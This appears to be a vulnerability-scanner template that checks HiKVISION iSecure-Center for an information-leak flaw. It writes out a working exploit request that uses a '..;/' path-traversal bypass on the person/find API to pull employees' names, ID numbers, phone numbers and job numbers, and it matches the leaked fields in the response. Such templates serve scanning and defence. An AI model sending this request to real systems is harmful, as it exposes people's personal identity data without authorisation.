id: isecure-center-leakinfo

info:
  name: HiKVISION iSecure-Center敏感信息泄露
  author: Hardess
  severity: High
  created: 2024/4/19

rules:
  r0:
    request:
      method: POST
      path: /isupm/api/api/..;/..;/person/find
      headers:
        Content-Type: application/json;charset=utf-8
      body: '
        {"organizationId":"root000000","pageSize":100,"pageNo":1,"name":"","casecadeSubOrganization":1}
        '
    expression: |
      response.status == 200 && response.body.bcontains(b'"code":"0"') && response.body.bcontains(b'"msg":"SUCCESS!"') && response.body.bcontains(b'data') && response.body.bcontains(b'personIndexCode') && response.body.bcontains(b'name') && response.body.bcontains(b'organizationPath') && response.body.bcontains(b'sex') && response.body.bcontains(b'certType') && response.body.bcontains(b'certNo') && response.body.bcontains(b'phone') && response.body.bcontains(b'jobNo')
expression: r0()
